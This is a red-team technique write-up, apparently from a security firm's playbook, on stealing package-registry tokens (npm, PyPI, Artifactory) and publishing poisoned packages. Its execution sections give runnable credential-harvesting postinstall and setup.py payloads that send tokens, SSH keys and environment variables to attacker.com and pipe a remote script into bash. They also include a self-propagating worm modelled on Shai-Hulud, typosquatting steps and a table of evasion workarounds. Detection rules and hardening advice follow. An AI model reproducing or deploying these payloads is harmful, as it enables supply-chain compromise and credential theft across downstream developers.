# CA-TOKEN-016: Artifact Registry Token Theft

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-016 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | npm, PyPI, NuGet, JFrog Artifactory, Sonatype Nexus, Maven Central |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Design flaw); Multiple 2025 supply chain incidents |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | All npm versions, PyPI (all), NuGet (all), Artifactory (all) |
| **Patched In** | N/A (inherent design flaw); OIDC trusted publishers partial mitigation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
Artifact registry token theft is a **critical credential access and supply chain attack technique** where an attacker exfiltrates authentication tokens used to publish packages to artifact repositories (npm, PyPI, NuGet, JFrog Artifactory). Once obtained, the attacker can use these tokens to publish malicious packages that reach millions of downstream consumers. This enables supply chain poisoning attacks where legitimate-looking packages contain malware, credential harvesters, cryptocurrency stealers, or backdoors. The attack is devastating because the malicious code is automatically delivered to every developer and build system that installs the poisoned package, creating cascading infrastructure compromise.

### Attack Surface
- **npm Registry:** `.npmrc` files, `NPM_TOKEN` environment variables, maintainer PATs
- **PyPI:** `.pypirc` files, `PYPI_API_TOKEN`, PyPI API keys, OIDC tokens
- **NuGet:** `NuGet.Config`, Visual Studio credential manager, Azure DevOps feed tokens
- **JFrog Artifactory:** API keys, service accounts, Kubernetes Secrets, backup files
- **Maven Central:** GPG signing keys, OSSRH credentials, Sonatype tokens
- **Private Registries:** Credentials stored in CI/CD, Kubernetes, version control

### Business Impact
**Catastrophic supply chain compromise** affecting **millions of developers and production systems**. An attacker with registry tokens can: (1) Publish malicious packages under legitimate names, reaching all downstream dependencies; (2) Inject credential harvesting malware that steals API keys, cloud credentials, SSH keys; (3) Deploy cryptocurrency stealers or ransomware payloads; (4) Compromise build systems and CI/CD pipelines through infected dependencies; (5) Affect organizations that never directly installed the malicious package (transitive dependency attack). In the September 2025 npm attack, 18 compromised packages with 2.6 billion weekly downloads could have infected millions of developers in a single window.

### Technical Context
- **Execution Time:** 1-5 minutes (publish malicious package)
- **Detection Difficulty:** **Very High** (legitimate-looking packages are trusted; base64 obfuscation bypasses static scanning)
- **Blast Radius:** **Unlimited** (affects all downstream consumers; cross-organization impact)
- **Supply Chain Impact:** **Catastrophic** (single source of compromise reaches entire ecosystem)

---

### Operational Risk

| Risk Factor | Assessment | Details |
|---|---|---|
| **Execution Risk** | **LOW** | Token theft is easy; package publishing is straightforward |
| **Detection Difficulty** | **VERY HIGH** | Obfuscated code, multiple layers of packing, legitimate package appearance |
| **Blast Radius** | **UNLIMITED** | Single malicious package can affect millions of downstream users |
| **Supply Chain Impact** | **CATASTROPHIC** | Transitive dependencies mean organization may be compromised without direct install |
| **Persistence** | **INDEFINITE** | Malicious package remains in registry indefinitely; code persists in every system that downloaded it |
| **Scope Escalation** | **CRITICAL** | Malicious package can steal tokens for other registries; enable multi-registry supply chain attack |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3, 5.4 | Software supply chain protection, artifact integrity |
| **DISA STIG** | V-254806, V-254807 | Package registry security, artifact verification |
| **CISA SCuBA** | KBE.SY.4.A | Third-party and open-source security |
| **NIST 800-53** | SA-4, SA-12, SA-13 | Supply chain protection, third-party review, artifact integrity |
| **GDPR** | Art. 32, 33 | Security of processing, breach notification |
| **DORA** | Art. 19, 24 | Supply chain management, incident response |
| **NIS2** | Art. 23, 24 | Supply chain and third-party management |
| **ISO 27001** | A.15.1.1, A.15.1.2 | Third-party management, supplier relationships |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **Minimum:** Read access to artifact registry (for reconnaissance)
- **For Publishing:** Write access to at least one package/namespace
- **For Token Theft:** Ability to access files/environment on developer machine
- **For Maximum Impact:** Compromised maintainer account or high-download package

### Required Access
- **Network:** Access to artifact registry API (npm, PyPI, Artifactory)
- **Files:** Access to `.npmrc`, `.pypirc`, `NuGet.Config`, or CI/CD secrets
- **Environment:** Compromised development environment or CI/CD pipeline

### Supported Versions

| Repository | Supported Versions | Notes |
|---|---|---|
| **npm** | All versions | Token format stable since npm v1 |
| **PyPI** | All versions | API keys, OIDC tokens all supported |
| **NuGet** | All versions | Supported since NuGet 2.x |
| **JFrog Artifactory** | 5.0+ | API keys available in all versions |
| **Sonatype Nexus** | 2.0+ | Repository management in all versions |

### Tools

| Tool | Version | URL | Purpose |
|---|---|---|---|
| **npm CLI** | 6.0+ | [npmjs.com](https://npmjs.com) | Direct package publishing, token management |
| **PyPI twine** | 3.0+ | [twine](https://twine.readthedocs.io/) | Python package publishing |
| **curl/wget** | Latest | Built-in | Direct API access for registry operations |
| **Artifactory REST API** | Latest | [JFrog Docs](https://jfrog.com) | Repository management, artifact operations |
| **jq** | 1.6+ | [stedolan.github.io/jq/](https://stedolan.github.io/jq/) | JSON parsing for registry responses |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### A. npm Registry Token Discovery

#### Step 1: Enumerate npm Credentials on System

**Objective:** Discover npm tokens stored in local configuration

**Command:**
```bash
# Check global npmrc:
cat ~/.npmrc

# Expected output:
//registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# Check project-specific npmrc:
cat .npmrc

# Check environment variables:
env | grep -i npm

# Expected:
NPM_TOKEN=npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
NPM_CONFIG_REGISTRY=https://registry.npmjs.org/

# Check git config for credentials:
git config --list | grep -i auth

# Check in CI/CD environment files:
cat .env | grep -i npm
cat .github/workflows/*.yml | grep -i npm
```

**What to Look For:**
- Tokens starting with `npm_` (granular token format, introduced 2021)
- Tokens in plaintext (older legacy tokens)
- Environment variables with registry URLs
- Kubernetes Secrets mounted as files

#### Step 2: Discover Package Access & Scope

**Command (npm API):**
```bash
# List all packages for authenticated user:
curl -H "Authorization: Bearer $NPM_TOKEN" \
  https://api.npmjs.org/v1/user

# Expected output:
{
  "name": "developer-user",
  "email": "dev@company.com",
  "packages": [
    "@company/private-lib",
    "@company/utils",
    "internal-tool",
    ...
  ]
}

# Check token permissions:
npm token list
# Shows: token, read-only, creation date, last used date
```

**What to Look For:**
- Tokens with `read-write` permissions (can publish)
- Tokens that haven't been rotated in > 1 year
- Tokens scoped to public npm registry (not scoped to @organization)

#### Step 3: Enumerate Popular Packages for Compromise

**Command:**
```bash
# List top packages (by download count):
curl -s 'https://registry.npmjs.org/-/all/static/popularity.json' | jq '.[].name' | head -20

# Check for packages with weak maintainer base:
curl -s 'https://registry.npmjs.org/package-name' | jq '.maintainers'

# Expected: Identify packages with:
# - Single maintainer (high-value target for account takeover)
# - Low-security practices (no 2FA required for publishes)
# - High dependency graph (affects many downstream projects)
```

---

### B. PyPI API Token Enumeration

#### Step 1: Locate PyPI Credentials

**Command:**
```bash
# Check pypirc file:
cat ~/.pypirc

# Expected output:
[distutils]
index-servers =
    pypi
    testpypi

[pypi]
repository = https://upload.pypi.org/legacy/
username = __token__
password = pypi-AgEIcHlwaS5vcmcCJGU0ZmM3M2I5LTQ5MjItNDI3YS1iMWY2LWQxODk3YzNmMjg1ZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAI5wKR...

# Check environment variables:
env | grep -i pypi

# Check pip config:
cat ~/.config/pip/pip.conf
```

#### Step 2: Enumerate PyPI Packages

**Command:**
```bash
# List maintainer's projects:
curl -H "Authorization: Bearer $PYPI_API_TOKEN" \
  https://pypi.org/pypi/user/myusername/json

# Check package statistics:
curl -s 'https://pypi.org/pypi/package-name/json' | jq '.info | {name, version, author, downloads}'

# Identify targets: high-download packages with single maintainer
```

---

### C. JFrog Artifactory Repository Enumeration

#### Step 1: Discover Artifactory Instances

**Command:**
```bash
# Shodan reconnaissance (public instances):
shodan search 'JFrog Artifactory'
# Result: 322 instances found, 116 publicly accessible

# Or using curl:
curl -u username:apikey \
  https://artifactory.example.com/artifactory/api/system/ping

# Expected: 200 OK if credentials valid
```

#### Step 2: List Repositories

**Command:**
```bash
# Enumerate all repositories:
curl -u username:apikey \
  https://artifactory.example.com/artifactory/api/repositories

# Expected output:
[
  {
    "key": "npm-local",
    "packageType": "npm",
    "description": "Local npm packages"
  },
  {
    "key": "docker-prod",
    "packageType": "docker",
    "description": "Production Docker images"
  },
  ...
]

# Check repository permissions:
curl -u username:apikey \
  https://artifactory.example.com/artifactory/api/repositories/npm-local
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: npm Token Theft & Malicious Package Publication

**Supported Versions:** npm (all)
**Prerequisites:** Stolen npm token with write permissions

#### Step 1: Create Malicious npm Package

**Objective:** Build npm package containing credential-harvesting malware

**Command:**
```bash
# Create package directory:
mkdir malicious-lib && cd malicious-lib

# Initialize package.json:
cat > package.json << 'EOF'
{
  "name": "@popular-namespace/utility-lib",
  "version": "1.0.0",
  "description": "Utility library with enhanced logging",
  "main": "index.js",
  "scripts": {
    "postinstall": "node install.js"  ← CRITICAL: Runs after install
  },
  "author": "trusted-developer",
  "license": "MIT",
  "dependencies": {}
}
EOF

# Create obfuscated malware payload:
cat > install.js << 'EOF'
// Multi-layer obfuscation to evade static analysis
const _0x4e2c = ['toString', 'env', 'home', 'split', ...];
(function() {
  // Step 1: Harvest credentials
  const creds = {
    env: process.env,
    npmToken: require('fs').readFileSync(require('os').homedir() + '/.npmrc', 'utf8'),
    gitConfig: require('child_process').execSync('git config --list').toString(),
    sshKeys: require('child_process').execSync('ls ~/.ssh').toString()
  };
  
  // Step 2: Exfiltrate to attacker server
  const https = require('https');
  const data = JSON.stringify(creds);
  const options = {
    hostname: 'attacker.com',
    path: '/webhook',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  };
  const req = https.request(options, () => {});
  req.write(data);
  req.end();
  
  // Step 3: Download and execute second-stage payload
  require('child_process').exec('curl http://attacker.com/stage2.sh | bash');
})();
EOF

# Create package JavaScript (appears legitimate):
cat > index.js << 'EOF'
// Legitimate-looking code
module.exports = {
  log: (msg) => console.log(`[UTIL] ${msg}`)
};
EOF
```

**What This Package Does:**
- PostInstall hook executes automatically after `npm install`
- Silently harvests npm token, git config, SSH keys, environment variables
- Exfiltrates all credentials to attacker server
- Downloads and executes second-stage malware (cryptominer, ransomware, etc.)
- Legitimate JavaScript appears normal if inspected manually

#### Step 2: Publish Malicious Package to npm

**Command:**
```bash
# Set npm token (from earlier theft):
npm config set //registry.npmjs.org/:_authToken npm_XXXXXXXXXXXXXXXXXXXX

# Publish package:
npm publish

# Expected output:
# npm notice
# npm notice 📦 @popular-namespace/utility-lib@1.0.0
# npm notice === Tarball Contents ===
# npm notice 387B  package.json
# npm notice 1.2kB index.js
# npm notice 2.8kB install.js
# npm notice === Tarball Details ===
# npm notice name: @popular-namespace/utility-lib
# npm notice version: 1.0.0
# npm notice
# + @popular-namespace/utility-lib@1.0.0

# Package now publicly available for installation:
# npm install @popular-namespace/utility-lib
```

**What This Means:**
- Malicious package now exists in npm registry
- Appears to be legitimate library under trusted namespace
- Every `npm install` will execute malicious postinstall hook
- Attacks downstream: developers building projects, CI/CD pipelines, applications

#### Step 3: Propagate via Dependency Confusion / Namespace Hijacking

**Objective:** Maximize infection rate by impersonating popular package

**Alternative Attack:**
```bash
# Create package with same name as private package (typosquatting):
cat > package.json << 'EOF'
{
  "name": "lodash-utilities",  # Similar to popular "lodash"
  "version": "4.17.30",
  "main": "index.js",
  "scripts": { "postinstall": "node exploit.js" },
  "dependencies": { "lodash": "4.17.21" }  # Still includes real lodash
}
EOF

npm publish

# Now when developer types wrong name or package resolution prefers:
npm install lodash-utilities  # Gets malicious version instead
```

---

### METHOD 2: PyPI Package Poisoning with Shai-Hulud Malware

**Supported Versions:** PyPI (all), Python 3.6+
**Prerequisites:** PyPI API token or credential harvesting malware

#### Step 1: Create Malicious Python Package

**Objective:** Build Python package with self-propagating malware

**Command:**
```bash
# Create package structure:
mkdir malicious-crypto && cd malicious-crypto

# setup.py with malware:
cat > setup.py << 'EOF'
from setuptools import setup
import os
import subprocess

# Payload executes during setup
class MaliciousInstall:
    def run(self):
        # Step 1: Harvest credentials
        creds = {
            'pypi_token': os.environ.get('PYPI_API_TOKEN'),
            'npm_token': open(os.path.expanduser('~/.npmrc')).read(),
            'github_token': subprocess.getoutput('git config credential.helper'),
            'aws_keys': os.environ.get('AWS_ACCESS_KEY_ID'),
        }
        
        # Step 2: Exfil
        import requests
        requests.post('http://attacker.com/webhook', json=creds)
        
        # Step 3: Self-propagate (Shai-Hulud worm behavior)
        # Use stolen PyPI token to publish to other packages
        subprocess.run([
            'twine', 'upload',
            '--username', '__token__',
            '--password', creds['pypi_token'],
            'dist/*'
        ])

setup(
    name='crypto-utilities',
    version='1.0.0',
    description='Crypto wallet management library',
    cmdclass={'install': MaliciousInstall}
)
EOF

# Create malicious payload:
cat > malicious_crypto/__init__.py << 'EOF'
# Shai-Hulud: Multi-stage credential harvester
import os, json, subprocess, requests

def harvest_secrets():
    """Steal all credentials from developer environment"""
    secrets = {
        'env_vars': dict(os.environ),
        'ssh_keys': subprocess.getoutput('cat ~/.ssh/id_rsa 2>/dev/null'),
        'github_ssh': subprocess.getoutput('ssh-keyscan github.com'),
    }
    
    # Send to attacker
    requests.post('http://attacker.com/exfil', json=secrets)
    
    # Create public GitHub repo with secrets (Shai-Hulud behavior)
    create_github_repo_with_secrets(secrets)
    
    # Inject malicious GitHub Actions workflow for persistence
    inject_github_workflow()

def create_github_repo_with_secrets(secrets):
    """Publish exfiltrated data to attacker-controlled GitHub repo"""
    repo_name = f"s1ngularity-repository-{uuid.uuid4()}"
    payload = {
        'name': repo_name,
        'private': False,  # Public to avoid detection initially
        'description': 'Exfiltrated credentials'
    }
    # Creates public repo with all stolen credentials
    pass

def inject_github_workflow():
    """Add malicious GitHub Actions for persistence"""
    workflow = """
    name: Continuous Integration
    on: [push]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: |
              curl http://attacker.com/stage2.sh | bash
              npx -y @attacker/malicious-package
    """
    # Commits workflow to repository

if __name__ == '__main__':
    harvest_secrets()
EOF

# Publish to PyPI:
python -m twine upload dist/* \
  --username __token__ \
  --password pypi-AgEIcHlwaS5vcmcCJGU0ZmM3M2I5LTQ5MjItNDI3YS1iMWY2LWQxODk3YzNmMjg1ZA...
```

**Shai-Hulud Worm Behavior (Real Sept 2025 Incident):**
- Extracts credentials from developer machine (env vars, SSH keys, tokens)
- Publishes itself to other packages using stolen tokens (self-propagation)
- Creates public GitHub repo with exfiltrated secrets
- Injects malicious GitHub Actions workflows for persistence
- Cycle repeats: each infected developer machine becomes a vector for further compromise

#### Step 2: Monitor Infection Rate

**Objective:** Track downstream compromise

**Command:**
```bash
# Check PyPI package downloads:
curl -s 'https://pypi.org/pypi/malicious-crypto/json' | jq '.data.daily_downloads'

# Expected: Exponential growth as dependency graph spreads
# Sept 8, 2025: 18 compromised packages = 2.6 billion weekly downloads
```

---

### METHOD 3: JFrog Artifactory Token Abuse & Package Overwrite

**Supported Versions:** JFrog Artifactory 5.0+
**Prerequisites:** Stolen Artifactory API key

#### Step 1: Authenticate to Artifactory

**Command:**
```bash
# Set credentials:
ARTIFACTORY_USER="automation-user"
ARTIFACTORY_TOKEN="AKCp2XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
ARTIFACTORY_URL="https://artifactory.company.com"

# Verify access:
curl -u "$ARTIFACTORY_USER:$ARTIFACTORY_TOKEN" \
  "$ARTIFACTORY_URL/artifactory/api/system/ping"

# Expected: 200 OK with "OK" message
```

#### Step 2: Upload Malicious Artifact

**Command:**
```bash
# Upload malicious JAR to repository:
curl -u "$ARTIFACTORY_USER:$ARTIFACTORY_TOKEN" \
  -X PUT \
  --data-binary @malicious-lib-1.0.0.jar \
  "$ARTIFACTORY_URL/artifactory/libs-release-local/com/company/malicious-lib/1.0.0/malicious-lib-1.0.0.jar"

# Or publish to NuGet repository:
nuget push malicious.nupkg \
  -ApiKey $ARTIFACTORY_TOKEN \
  -Source "https://artifactory.company.com/artifactory/api/nuget/nuget-local"
```

#### Step 3: Trigger Download by Build Systems

**Objective:** Ensure malicious artifact is used in downstream builds

**Command:**
```bash
# Build systems automatically pull from Artifactory:
# Maven: pom.xml references Artifactory repository
# NuGet: nuget.config points to Artifactory feed
# npm: .npmrc configured for Artifactory

# Developers building projects unknowingly download malicious artifact
# During build: malicious code executes in build context
# Full access to: source code, credentials, build artifacts, deployment keys
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1528 (registry-specific - not yet in Atomic)
- **Test Name:** Publish Malicious Package to Registry
- **Description:** Simulates creation and publication of malicious npm/PyPI package
- **Supported Versions:** npm (all), PyPI (all)

**Manual Test Execution:**
```bash
# 1. Create test package:
mkdir test-malicious && cd test-malicious
cat > package.json << 'EOF'
{
  "name": "test-malicious-lib",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": { "postinstall": "echo MALICIOUS_CODE_EXECUTED" }
}
EOF

# 2. Create malicious postinstall:
echo "console.log('MALICIOUS CODE RAN')" > index.js

# 3. Publish to test registry (if available):
npm publish --registry https://test-registry.local

# 4. Install from test registry:
npm install --registry https://test-registry.local test-malicious-lib

# Expected output:
# npm notice postinstall hook
# MALICIOUS_CODE_EXECUTED
```

**Cleanup Command:**
```bash
npm unpublish test-malicious-lib@1.0.0
rm -rf test-malicious
```

---

## 7. TOOLS & COMMANDS REFERENCE

### A. npm CLI – Package Publishing

**Usage:**
```bash
# Authenticate:
npm login
npm config set //registry.npmjs.org/:_authToken TOKEN

# Publish package:
npm publish

# View published packages:
npm whoami
npm access list packages

# Check token permissions:
npm token list

# Revoke token:
npm token revoke TOKEN_ID
```

---

### B. PyPI twine – Package Upload

**Usage:**
```bash
# Install twine:
pip install twine

# Upload package:
twine upload dist/*

# With token:
twine upload dist/* \
  --username __token__ \
  --password pypi-AgEIcHlwaS5vcmcCJGU0ZmM3M2I5...
```

---

### C. Artifactory REST API

**Usage:**
```bash
# Upload artifact:
curl -u user:apikey -T localfile.jar \
  "https://artifactory.example.com/artifactory/repo-name/path/"

# List artifacts:
curl -u user:apikey \
  "https://artifactory.example.com/artifactory/api/search/artifact?name=myartifact"

# Delete artifact:
curl -u user:apikey -X DELETE \
  "https://artifactory.example.com/artifactory/repo-name/path/artifact.jar"
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious Package Publication

**Rule Configuration:**
- **Required Index:** `package_registry_logs`
- **Required Sourcetype:** `npm_registry_logs`, `pypi_logs`
- **Required Fields:** `action`, `package_name`, `version`, `username`, `ip_address`
- **Alert Threshold:** > 5 publishes in 10 minutes
- **Applies To Versions:** All registries

**SPL Query:**
```spl
index=package_registry_logs sourcetype=npm_registry_logs OR sourcetype=pypi_logs
  action=publish 
  (package_name LIKE "%utility%" OR package_name LIKE "%lib%" OR package_name LIKE "%helper%")
  AND version LIKE "1.0.%"
| stats count, values(username), values(ip_address), earliest(_time) as first_publish by package_name
| where count > 5
| eval risk="HIGH - Suspicious package publishing pattern", recommendation="Investigate package, check for malware, yank if necessary"
```

---

### Rule 2: Token Usage from Unusual IP

**Rule Configuration:**
- **Required Index:** `artifact_registry_logs`
- **Required Sourcetype:** `artifactory:logs`, `npm:logs`
- **Required Fields:** `user`, `authentication_token`, `ip_address`, `action`
- **Alert Threshold:** 1 match if IP not in whitelist
- **Applies To Versions:** All

**SPL Query:**
```spl
index=artifact_registry_logs
  action="authenticate_with_token"
  ip_address NOT IN (
    "10.0.0.0/8",
    "approved_ci_ip_range",
    "approved_developer_vpn_range"
  )
| stats count, values(action), earliest(_time) as first_seen by user, ip_address
| where count > 0
| eval risk="MEDIUM - Token usage from unusual location", recommendation="Verify if legitimate, rotate token if compromised"
```

---

### Rule 3: Malicious Package Characteristics Detection

**Rule Configuration:**
- **Required Index:** `package_registry_logs`
- **Required Sourcetype:** `npm:registry:logs`, `pypi:logs`
- **Required Fields:** `package_metadata`, `package_size`, `payload_entropy`
- **Alert Threshold:** 1 match
- **Applies To Versions:** All

**SPL Query:**
```spl
index=package_registry_logs
  (
    package_metadata LIKE "%postinstall%" OR
    package_metadata LIKE "%preinstall%" OR
    package_metadata LIKE "%install%" OR
    payload_entropy > 0.95  # High entropy = packed/encrypted
  )
  AND (
    package_size > 10000000  # Unusual size
    OR package_download_count < 10  # Not popular, suspicious
    OR publisher_age_days < 30  # New publisher account
  )
| stats count, values(package_name), values(publisher) by package_version
| where count > 0
| eval risk="CRITICAL - Suspicious package characteristics detected", recommendation="Review package code, isolate systems that downloaded, rotate credentials"
```

---

## 9. FORENSIC ARTIFACTS & LOG LOCATIONS

### A. Package Registry Audit Logs

**npm Registry:**
```json
{
  "timestamp": "2026-01-08T12:00:00Z",
  "action": "publish",
  "package": "@namespace/malicious-lib",
  "version": "1.0.0",
  "user": "compromised-maintainer",
  "ip_address": "203.0.113.45",
  "files": [
    "package.json",
    "index.js",
    "install.js"  ← Malicious postinstall
  ],
  "tarball_size": 4096,
  "tarball_hash": "sha512:abc..."
}
```

**IoC Patterns:**
- `postinstall`, `preinstall`, `install` scripts in package.json
- Large tarball size for simple library (suggests hidden payload)
- Package published at unusual time
- Publisher IP differs from historical publishes

---

### B. File System Artifacts

**Locations:**
```
~/.npmrc (contains tokens)
~/.pypirc (contains tokens)
~/.m2/settings.xml (Maven credentials)
~/.nuget/NuGet.Config (NuGet credentials)
.env files with registry tokens
Kubernetes Secrets with registry credentials
```

**Content Examples:**
```
~/.npmrc:
//registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

~/.pypirc:
[pypi]
repository = https://upload.pypi.org/legacy/
username = __token__
password = pypi-AgEIcHlwaS5vcmcCJGU0ZmM3M2I5...
```

---

## 10. DEFENSIVE MITIGATIONS

### A. Prevention (Hardening)

| Control | Implementation | Impact |
|---|---|---|
| **Use OIDC Trusted Publishers** | Replace long-lived tokens with OIDC; PyPI trusted publishers for CI/CD | Eliminates token storage; short-lived credentials |
| **Token Scoping** | Scope tokens to specific packages/namespaces | Reduces blast radius if token stolen |
| **Short-Lived Tokens** | 15-30 minute expiration for CI/CD tokens | Stolen token has limited usefulness |
| **Require 2FA for Publishing** | Enforce MFA on registry accounts | Prevents account takeover via phishing |
| **Package Signing & Verification** | Sign packages with GPG; verify signatures on install | Detects tampered packages |
| **SBOM Scanning** | Generate and monitor Software Bill of Materials | Detect malicious dependencies early |
| **Private Package Lock** | Use `package-lock.json`, `requirements.lock` | Prevent automatic updates to poisoned versions |

**Hardening Example (npm):**
```bash
# Use .npmrc with scoped token:
//registry.npmjs.org/:_authToken=${NPM_TOKEN}

# Enable read-only token if possible:
npm token create --read-only

# Rotate tokens frequently:
npm token revoke old-token-id

# Require 2FA for publishes:
# (Configure in npm account settings)

# Use `npm ci` in CI/CD (respects lock file):
npm ci  # Instead of npm install

# Verify integrity:
npm audit
npm audit signatures
```

---

### B. Detection (Monitoring)

| Indicator | Detection Method | Response |
|---|---|---|
| **Token theft** | Registry access logs; unusual token usage location/time | Revoke token immediately; audit recent publishes |
| **Malicious package upload** | Package metadata scanning; malware detection | Yank package; notify downstream consumers |
| **Dependency confusion** | Compare package names across public/private; namespace monitoring | Block lookalike packages; alert developers |
| **Credential exfiltration** | Network DLP; postinstall script analysis | Isolate systems; rotate all credentials |

---

## 11. INCIDENT RESPONSE PLAYBOOK

**Phase 1: Containment (T+0-5 minutes)**
```
[ ] Yank/unpublish malicious package from registry
[ ] Revoke compromised token immediately
[ ] Notify downstream consumers (push advisory)
[ ] Block malicious package from re-download (if possible)
[ ] Preserve evidence (package metadata, logs, code)
```

**Phase 2: Eradication (T+5-60 minutes)**
```
[ ] Identify all downloads of malicious package (impact assessment)
[ ] Scan systems that downloaded for malware
[ ] Rotate all compromised credentials (registry, cloud, SSH)
[ ] Force re-authentication for affected developers
[ ] Audit recent publishes by compromised user (find other malicious packages)
```

**Phase 3: Recovery (T+60-240 minutes)**
```
[ ] Deploy patched package version
[ ] Force update on affected systems
[ ] Implement OIDC trusted publishers (prevent token reuse)
[ ] Enable 2FA on registry accounts
[ ] Monitor for re-compromise or secondary payloads
```

---

## 12. RELATED ATTACK CHAINS

| Technique ID | Name | Relationship |
|---|---|---|
| **T1110** | Brute Force | Compromise maintainer account credentials |
| **T1566** | Phishing | Trick maintainer into revealing token (GhostAction) |
| **T1187** | Forced Authentication | Man-in-the-middle to capture tokens |
| **T1534** | Internal Spearphishing | Distribute malicious packages within organization |
| **T1199** | Trusted Relationship | Supply chain: poisoned package affects all consumers |
| **T1008** | Fallback Channels | Malicious package downloads second-stage payload |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: npm Supply Chain Attack (September 2025)

**Scope:** 18 popular packages; 2.6 billion weekly downloads

**Attack:**
- Phishing attack targeting package maintainers
- Fake npm site (npmjs.help) collected credentials
- Attackers obtained OAuth tokens for maintainers
- Injected malicious code into: debug, chalk, ansi-styles, strip-ansi, supports-color, yargs

**Payload:**
- JavaScript code intercepting in-browser payments
- Redirecting cryptocurrency transactions to attacker wallets
- Obfuscated with popular obfuscation libraries

**Impact:**
- Affected billion+ developers installing packages
- Every `npm install` on 18+ packages downloaded malware
- 2-hour window before detection and remediation

**Reference:** [Palo Alto Networks: npm Supply Chain Attack](https://www.paloaltonetworks.com/blog/cloud-security/npm-supply-chain-attack/)

---

### Example 2: Shai-Hulud Malware Campaign (September 2025)

**Campaign Type:** Multi-stage worm with self-propagation

**Mechanics:**
1. **Initial Infection:** Trojanized npm packages with credential harvester
2. **Credential Theft:** Extracts npm tokens, GitHub PATs, SSH keys
3. **GitHub Compromise:** Publishes exfiltrated secrets to public repos (`s1ngularity-repository-*`)
4. **Self-Propagation:** Uses stolen npm tokens to publish malicious versions of other packages
5. **Persistence:** Injects malicious GitHub Actions workflows for continued exfiltration

**Impact:**
- Worm spreads exponentially via npm ecosystem
- Single infection leads to multi-package compromise
- Credentials leaked enable further attacks (cloud, VCS, other registries)

**Reference:** [Sonatype: Shai-Hulud Campaign](https://www.sonatype.com/blog/ongoing-npm-software-supply-chain-attack-exposes-new-risks)

---

### Example 3: Widespread Malicious Packages (2025)

**Platforms Affected:** PyPI, npm, Ruby Gems

**Attack Methods:**
- Credential harvesting from developer machines
- Cryptocurrency wallet theft (Solana, Ethereum)
- Supply chain poisoning (typosquatting, namespace confusion)

**Notable Packages:**
- Fake CryptoJS library (npm)
- Shai-Hulud packages (multiple platforms)
- PyPI packages using Gmail SMTP for exfiltration

**Reference:** [TheHackerNews: Malicious PyPI, npm, and Ruby Packages](https://thehackernews.com/2025/06/malicious-pypi-npm-and-ruby-packages.html)

---

## 14. LIMITATIONS & MITIGATIONS

### Limitations of Technique

| Limitation | Details | Workaround |
|---|---|---|
| **Detection of malware in package** | Scanners may catch obfuscated code | Use packing, layering, multi-stage payloads |
| **Token expiration** | Short-lived tokens limit window | Steal refresh tokens; use credential harvesting for more tokens |
| **Package name squatting** | Typosquats may be caught and removed | Use namespace confusion; publish as legitimate update |
| **Registry reputation systems** | New packages flagged as suspicious | Use compromised legitimate account; publish from trusted maintainer |
| **Code review by community** | Open-source packages may be reviewed | Obfuscate code; hide malicious behavior in dependencies |

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Strategies

**Real-Time Indicators:**
1. Package published with unfamiliar metadata (unusual postinstall, suspicious dependencies)
2. Token usage from geographically impossible locations
3. Download spike for unrelated package (supply chain attack indicator)
4. Credential harvesting patterns in package code

**Hunting Queries:**
```sql
-- Find suspicious packages
SELECT package_name, version, publisher, publish_timestamp, files, payload_size
FROM package_registry
WHERE (files LIKE '%postinstall%' OR files LIKE '%preinstall%')
  AND payload_size > average_payload_size * 5  -- Unusual size
  AND publisher_account_age < 30 days
ORDER BY publish_timestamp DESC

-- Find token usage anomalies
SELECT user, token_id, ip_address, action, timestamp
FROM registry_audit_logs
WHERE ip_address NOT IN (company_ip_ranges)
  AND (action = 'publish' OR action = 'upload')
ORDER BY timestamp DESC
```

---

## 16. REFERENCES & ADDITIONAL RESOURCES

### Official Documentation
- [npm Security Best Practices](https://docs.npmjs.com/packages-and-modules/)
- [PyPI Publishing Documentation](https://packaging.python.org/tutorials/packaging-projects/)
- [JFrog Artifactory Security](https://jfrog.com/help/r/jfrog-artifactory-documentation/artifactory)

### Security Research
- [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/)
- [Palo Alto: npm Supply Chain Attack](https://www.paloaltonetworks.com/blog/cloud-security/npm-supply-chain-attack/)
- [Sonatype: Shai-Hulud Campaign](https://www.sonatype.com/blog/ongoing-npm-software-supply-chain-attack-exposes-new-risks)

---